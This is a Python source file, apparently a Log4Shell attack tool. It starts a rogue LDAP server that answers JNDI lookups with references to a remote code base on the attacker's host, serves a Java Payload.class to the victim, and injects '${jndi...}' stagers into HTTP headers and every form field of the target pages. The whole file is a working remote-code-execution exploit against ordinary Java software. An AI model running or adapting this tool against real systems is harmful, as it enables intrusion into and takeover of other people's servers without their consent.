#!/usr/bin/env python3
import asyncio
import importlib
import string

from bs4 import BeautifulSoup

from horrors import (
    events,
    logging,
    scenarios,
    services,
)


try:
    import attacker_config as config
except ImportError:
    exit('Configuration file `attacker_config.py` not found!')


def class_import(path):
    module, _, class_name = path.rpartition('.')
    path_module = importlib.import_module(module)
    clss = getattr(path_module, class_name)
    return clss


class Serializer:

    def __init__(self):
        self.payload = bytes()
        self.size_stack = list()

    def push(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.payload = data + self.payload
        return self

    def pop_size(self):
        return self.push(bytes([len(self.payload) - self.size_stack.pop()]))

    def push_size(self, count=1):
        for _ in range(count):
            self.size_stack.append(len(self.payload))
        return self

    def build(self):
        return self.payload

    def __repr__(self):
        return f'Serializer {self.payload}'


class Template(string.Template):

    delimiter = '%%'


class JNDI(services.Service):

    RESPONSE_SUCCESS = b'0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00'
    RESPONSE_HELLO = b'0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00'
    RESPONSE_LDAP_SERIALIZED = {
        'javaClassName': 'Payload',
        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
        'javaSerializedData': '\xac\xed\x00\x05\x73\x72\x00\x06\x43\x75\x73\x74\x6f\x6d\x2e\x2e\x6e\xdf\xa1\x51\x24\x51\x02\x00\x00\x78\x70',
    }
    RESPONSE_LDAP_REFERENCE = {
        'javaClassName': 'Payload',
        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
        'objectClass': 'javaNamingReference',
        'javaFactory': 'Payload',
    }
    RESPONSE_LDAP = {
        'reference': RESPONSE_LDAP_REFERENCE,
        'serialized': RESPONSE_LDAP_SERIALIZED,
    }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for ldap_type in self.RESPONSE_LDAP.values():
            for key, val in ldap_type.items():
                try:
                    ldap_type[key] = string.Template(val).substitute(**self.scenario.context)                
                except KeyError:
                    pass

    def serialize(self, query_name):
        try:
            template = self.RESPONSE_LDAP[query_name]
        except KeyError:
            # NOTE: Fallback to `RESPONSE_LDAP_REFERENCE` by default if unknown query path
            template = self.RESPONSE_LDAP_REFERENCE
        serializer = Serializer()
        serializer.push_size(2)
        for key, val in template.items():
            serializer.push_size(3).push(val).pop_size().push(b'\x04').pop_size().push(b'1')
            serializer.push_size().push(key).pop_size().push(b'\x04').pop_size().push(b'0')
        serializer.push(b'0\x81\x82').push_size().push(query_name).pop_size().push(b'\x04').pop_size()
        serializer.push(b'\x02\x01\x02d\x81').pop_size().push(b'0\x81')
        response = serializer.build() + self.RESPONSE_SUCCESS
        logging.debug('Sending LDAP response: ' + str(response))
        return response

    async def handler(self, reader, writer):
        logging.info('{}:{} requested data, responding with payload...'.format(*reader._transport._sock.getpeername()))
        await reader.read(8096)
        writer.write(self.RESPONSE_HELLO)
        await asyncio.sleep(0.5)
        query = await reader.read(8096)
        try:
            query_name = query[9:9 + query[8]].decode()
        except IndexError:
            pass
        else:
            logging.debug('Responding to query: ' + query_name)
            response = self.serialize(query_name)
            writer.write(response)
            await asyncio.sleep(0.5)
            await reader.read(8096)  # NOTE: Acknowledge
            await writer.drain()
        writer.write_eof()
        writer.close()


async def send_requests(scenario):

    stagers = list()
    for ldap_type in JNDI.RESPONSE_LDAP.keys():
        for port in config.JNDI_PORTS:
            for bypass in config.BYPASSES:
                stagers.append(
                    Template('${' + bypass + '/' + ldap_type + '}').substitute(JNDI_PORT=port, **scenario.context)
                )

    for stager in stagers:
        logging.debug('Using stager: ' + stager)
        for header in config.HTTP_HEADERS:
            logging.debug('Using header: ' + header)
            headers = {header: stager}
            for target in config.TARGETS:
                response = await scenario.http_get(
                    target,
                    headers,
                )
                logging.debug('Got HTTP response: ' + str(response))
                if response['status'] == 200:
                    input_fields = BeautifulSoup(response['content'], 'html.parser').find_all('input')
                    if input_fields:
                        data = {field.get('name'): stager for field in input_fields}
                        response = await scenario.http_post(
                            target,
                            data,
                            headers,
                        )
                        logging.debug('Got HTTP response: ' + str(response))


class Server(services.HTTPStatic):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload = class_import(config.PAYLOAD_CLS)(config)

    def payload(self, request, sock):
        context = self.scenario.context.copy()
        context['VICTIM_HOST'] = sock.getpeername()[0]
        output = self.payload.generate(context)
        logging.debug(str(context['VICTIM_HOST']) + ' requested payload, delivering...')
        return output


if __name__ == '__main__':

    context = {
        'ATTACKER_HOST': config.ATTACKER_HOST,
        'ATTACKER_PORT': config.ATTACKER_PORT,
        'COLLECTOR_PORT': config.COLLECTOR_PORT,
    }

    story = scenarios.Scenario(**context)
    # story.set_proxy('http://127.0.0.1:8088')
    story.set_headers({
        'User-Agent': 'Automated log4j testing',
    })

    httpd = Server(story, address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
    httpd.add_route('/', 'Welcome')
    httpd.add_route('/send-requests', 'Sending requests...')
    httpd.add_route('/Payload.class', Server.payload)
    httpd.add_event('run', when=events.PathContains('send-requests'))

    story.set_debug()
    for port in config.JNDI_PORTS:
        JNDI(story, address=context['ATTACKER_HOST'], port=port)
    story.add_scene(send_requests, when='run')
    story.add_scene(send_requests)
    story.play()
